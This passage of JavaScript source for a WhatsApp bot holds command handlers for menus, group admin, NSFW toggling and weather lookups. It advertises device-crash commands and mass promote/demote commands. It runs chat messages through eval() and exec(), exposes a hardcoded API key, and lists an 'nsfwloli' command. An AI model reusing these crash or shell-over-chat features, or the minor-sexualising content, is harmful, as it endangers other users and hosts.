   if (!m.isGroup) return reply(mess.group)
   if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.owner)
   if (!isBotAdmins) return reply(mess.botAdmin)

  const peromoteall = (args[0] === 'numBut')
    ? text.replace(`${args[0]} `, '').split('|')
    : (Number(args[0]))
      ? groupMetadata.participants
        .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
        .map(item => item.id)
      : groupMetadata.participants
        .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
        .map(item => item.id);
        
  for (let promote of peromoteall) {
    await Venox.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
    await sleep(100);
  }
  
  irisreply(`Success`);
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'demoteall': {
   if (!m.isGroup) return reply(mess.group)
   if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.owner)
   if (!isBotAdmins) return reply(mess.botAdmin)

  const deemoteall = (args[0] === 'numBut')
    ? text.replace(`${args[0]} `, '').split('|')
    : (Number(args[0]))
      ? groupMetadata.participants
        .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
        .map(item => item.id)
      : groupMetadata.participants
        .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
        .map(item => item.id);
        
  for (let demote of deemoteall) {
    await Venox.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
    await sleep(100);
  }
  
  irisreply(`Success`);
}
break;
//-------------------------------< EVERY-MENUS >----------------------------------
case 'menu':
case 'help': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "✨", key: m.key } });
    loading();

    let mono = "```";
    const helpmenu = `
${mono}Konnichiwa *${pushname}* Senpai..! *${nowtime}*
📚*ᴜᴘ ᴛɪᴍᴇ:* ${iristime}
🍁*ᴛᴏᴅᴀʏ ɪs:*  ${irisdate}
📍*ɴᴏᴡ ᴛɪᴍᴇ:* ${runtime(process.uptime())}

➮ Bᴏᴛɴᴀᴍᴇ:  ${global.botname}
➮ Sᴘᴇᴇᴅ:  ${latensie.toFixed(4)} miliseconds
➮ OᴡɴᴇʀNᴜᴍ:  ${ownernumber}
➮ Mᴏᴅᴇ: ${Venox.public ? 'Public' : `Private`}
➮ Pʀᴇᴍɪᴜᴍ:  ${isPrem ? '✅' : `❌`}
${mono}
╭───────────────────────·
│   ＬＩＳＴ - ＭＥＮＵ
╰───────────────────────
${mono}1. toolmenu${mono}
${mono}2. downloadermenu${mono}
${mono}3. groupmenu${mono}
${mono}4. ownermenu${mono}
${mono}5. animemenu${mono}
${mono}6. aimenu${mono}
${mono}7. mainmenu${mono}
${mono}8. funmenu${mono}
${mono}9. bugmenu${mono}
${mono}10. nsfwmenu${mono}

Reply with prefix for desired menu! *${prefix}toolmenu* 🎁`;

    let msg = {};
    switch (typemenu) {
        case 'v1':
            msg = {
                image: { url: `https://i.ibb.co/qgZfkn6/Purple-Gradient-Illustration-Youtube-Channel-Art.png` },
                caption: helpmenu,
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: false,
                        title: global.botname,
                        sourceUrl: global.link,
                        body: `Iris-Md whatsapp botto 🎁`
                    }
                }
            };
            break;
        case 'v2':
            msg = {
                video: { url: global.vidmenu },
                caption: helpmenu,
                gifPlayback: true
            };
            break;
        case 'v3':
            msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "messageContextInfo": {
                            "deviceListMetadata": {},
                            "deviceListMetadataVersion": 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: helpmenu
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: botname
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                ...(await prepareWAMessageMedia({ image: { url: `https://i.ibb.co/qgZfkn6/Purple-Gradient-Illustration-Youtube-Channel-Art.png` }, upload: XeonBotInc.waUploadToServer })),
                                title: ``,
                                gifPlayback: true,
                                subtitle: ownername,
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "cta_url",
                                        "buttonParamsJson": "{\"display_text\":\"Script 🎁\",\"url\":\"https://github.com/V-E-N-O-X/IRIS-MD\",\"merchant_url\":\"https://www.google.com\"}"
                                    },
                                    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{"display_text":"🎁 mainmenu 🎁","id":"${prefix}1.7"}`
                                    }
                                ],
                            }),
                            contextInfo: {
                                mentionedJid: [m.sender],
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363222395675670@newsletter',
                                    newsletterName: ownername,
                                    serverMessageId: 143
                                }
                            }
                        })
                    }
                },
            });
            break;
        default:
            msg = { text: helpmenu };
            break;
    }

    await Venox.sendMessage(m.chat, msg, { quoted: m });
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.1':
case 'toolmenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const toolmenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🛠*ᴛᴏᴏʟs-ᴍᴇɴᴜ*🛠 ━━━〢

❒  ${mono}sticker, smeme, steal, truecaller, toimage, tomp4, toaudio, tomp3, tovn, togif, tourl, vv, toqr, fliptext, listvn, liststicker, listimage, listvideo, calculator, translate, qt, gitclone, ghstalk${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: toolmenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.2':
case 'downloadermenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const dlmenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ ⚡*ᴅᴏᴡɴʟᴏᴀᴅᴇʀ-ᴍᴇɴᴜ*⚡ ━━━〢

❒  ${mono}gimage, film, play, song, ytmp3, ig, mp4, jpeg, igtv, twitter, twittermp3, igreels, ytmp4, earthquake, covidinfo, spotify, lyrics, fbmp3, tiktoknowm, happymod${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: dlmenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.3':
case 'groupmenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const groupmenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🎁*ɢʀᴏᴜᴘ-ᴍᴇɴᴜ*🎁 ━━━〢

❒  ${mono}closetime, opentime, kick, add, antilink, promote, demote, setsubject, setgcdesk, setgcpic, tagall, totag, hidetag, group, editinfo, linkgc, resetlink, listonline, tagadmins, afk${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: groupmenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.4':
case 'ownermenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const ownermenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🎈*ᴏᴡɴᴇʀ-ᴍᴇɴᴜ*🎈 ━━━〢

❒  ${mono}setprefix, restart, shutdown, mode, autotyping, autorecord, addprem, delprem, listprem, autostatusview, autobio, setexif, join, setppbot, block, unblock, leave, backup, bcgroup, delete, emojimix, ban${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: ownermenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.5':
case 'animemenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const animemenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🍀*ᴀɴɪᴍᴇ-ᴍᴇɴᴜ*🍀 ━━━〢

❒  ${mono}anime, manga, waifu, neko, loli, woof, 8ball, goose, gecg, feed, avatar, fox_girl, lizard, spank, meow, tickle, wallpaper, animestory${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: animemenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.6':
case 'aimenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const aimenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🌈*ᴀɪ-ᴍᴇɴᴜ*🌈 ━━━〢

❒  ${mono}mathai, bardai, blackboxai, photoleapai, llama, geminiai, chatgpt, tempinbox, enhance, dehaze${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: aimenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.7':
case 'mainmenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const mainmenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🚩*ᴍᴀɪɴ-ᴍᴇɴᴜ*🚩 ━━━〢

❒  ${mono}ping, runtime, owner, alive, sysinfo, buypremium, scriptbot, repo, report, myip${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: mainmenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.8':
case 'funmenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const funmenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🎀*ꜰᴜɴ-ᴍᴇɴᴜ*🎀 ━━━〢

❒  ${mono}tictactoe, dice, flipcoin, rps, couplepp, kopi, soulmate, truth, dare, cry, kill, hug, pat, lick, kiss, bite, yeet, bully, bonk, wink, poke, nom, slap, smile, wave, awoo, blush, smug, glomp, happy, dance, cringe, cuddle, highfive, shinobu, handhold, stupidcheck, uncleancheck, hotcheck, smartcheck, evilcheck, dogcheck, coolcheck, waifucheck, handsomecheck, beautifulcheck, awesomecheck, greatcheck, gaycheck, cutecheck, lesbiancheck, hornycheck, prettycheck, lovelycheck, uglycheck${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: funmenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '1.9':
case 'bugmenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const bugmenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 🐞*ʙᴜɢ-ᴍᴇɴᴜ*🐞 ━━━〢

❒  ${mono}clearchat, lowcrash, midcrash, highcrash, iosgoogle, iosgooglev2, ioscrash, ioscrashv2, kickall, promoteall, demoteall${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: bugmenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< EVERY-MENUS >----------------------------------
case '2.0':
case 'nsfwmenu': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!AntiNsfw) return reply(mess.nonsfw);
    if (!m.isGroup) return reply(mess.group);
    Venox.sendMessage(from, { react: { text: "🎁", key: m.key } });
    loading()

    let mono = "```";
    const nsfwmenu = `
ʜᴇʟʟᴏ *${pushname}* sᴇɴᴘᴀɪ..! *${nowtime}*\n
*╭─「 ʙᴏᴛ-ɪɴꜰᴏ 」*
*│ꕥ ʀᴀᴍ ɪɴғᴏ -* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
*│ꕥ ᴘʀᴇꜰɪx -* _[ ${prefix} ]_
*╰──────────*

      〢━━━ 👙*ɴsꜰᴡ-ᴍᴇɴᴜ*👙 ━━━〢

❒  ${mono}ahegao, ass, bdsm, blowjob, cuckold, cum, eba, ero, femdom, foot, gangbang, glasses, hentai, jahy, mangansfw, masturbation, milf, neko, neko2, nsfwloli, orgy, panties, pussy, tentacles, thights${mono}
`;
await Venox.sendMessage(from, {
        image: `https://i.ibb.co/58bwq00/2d0cd381feadfcea229d62fb0223ae4a.jpg`,
        caption: nsfwmenu,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: false,
                title: global.botname,
                sourceUrl: global.link,
                body: `Iris-Md whatsapp botto 🎁`
            }
        }
    }, {
        quoted: m
    });
    
    break;
}
//-------------------------------< CASE >----------------------------------
 case 'nsfw': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.group);
        if (!isBotAdmins) return reply(mess.botAdmin);
        if (!isAdmins && !isCreator) return reply(mess.admin);
        Venox.sendMessage(from, { react: { text: "⚠️", key: m.key } });

        if (args[0] === "on") {
          if (AntiNsfw) return reply('Already activated');
          ntnsfw.push(from);
          irisreply('Enabled NSFW Commands!');
        } else if (args[0] === "off") {
          if (!AntiNsfw) return irisreply('Already deactivated');
          let off = ntnsfw.indexOf(from);
          ntnsfw.splice(off, 1);
          irisreply('Disabled NSFW Commands!');
        } else {
          irisreply(`NSFW(not safe for work) feature has been enabled in this group, which means anyone here can accesss Adult commands!\n\nPlease use *'${prefix}nsfw on*' to enable NSFW commands or *'${prefix}nsfw off'* to disable them.`);
        }
      }
        break;
//-------------------------------< CASE >----------------------------------
case 'weather':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Venox.sendMessage(from, { react: { text: "✨", key: m.key } })
        if (!args[0]) return reply("Enter your location to search weather.")
        myweather = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args.join(" ")}&units=metric&appid=e409825a497a0c894d2dd975542234b0&language=tr`)

        const weathertext = `           🌤 *Weather Report* 🌤  \n\n🔎 *Search Location:* ${myweather.data.name}\n*💮 Country:* ${myweather.data.sys.country}\n🌈 *Weather:* ${myweather.data.weather[0].description}\n🌡️ *Temperature:* ${myweather.data.main.temp}°C\n❄️ *Minimum Temperature:* ${myweather.data.main.temp_min}°C\n📛 *Maximum Temperature:* ${myweather.data.main.temp_max}°C\n💦 *Humidity:* ${myweather.data.main.humidity}%\n🎐 *Wind:* ${myweather.data.wind.speed} km/h\n`
        Venox.sendMessage(from, { video: { url: 'https://media.tenor.com/bC57J4v11UcAAAPo/weather-sunny.mp4' }, gifPlayback: true, caption: weathertext }, { quoted: m })

        break;
//-------------------------------
//-------------------------------
 case '':
   if (isCmd) {
   if (isBan) return reply(mess.banned);
   if (isBanChat) return reply(mess.bangc);
   Venox.sendMessage(from, { react: { text: "✨", key: m.key } })
	   
   reply(`Do you need any help ${pushname} ? Type *${prefix}help* to get my full command list.`)
  }
  break;
//-------------------------------
//-------------------------------
default:

          if (isCmd) {
          if (isBan) return reply(mess.banned);
          if (isBanChat) return reply(mess.bangc);
          Venox.sendMessage(from, { react: { text: "❌", key: m.key } })
          reply(`Hey *${pushname}* senpai! this command is incorrect! Type *${prefix}help* to get my full command list!`)
        }
	if (budy.startsWith('=>')) {
                    if (!isCreator) return iris(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return irisreply(bang)
                    }
                    try {
                        irisreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        irisreply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return irisreply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await irisreply(evaled)
                    } catch (err) {
                        await irisreply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return irisreply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return irisreply(err)
                        if (stdout) return irisreply(stdout)
                    })
                }
        }
    } catch (err) {
        Venox.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
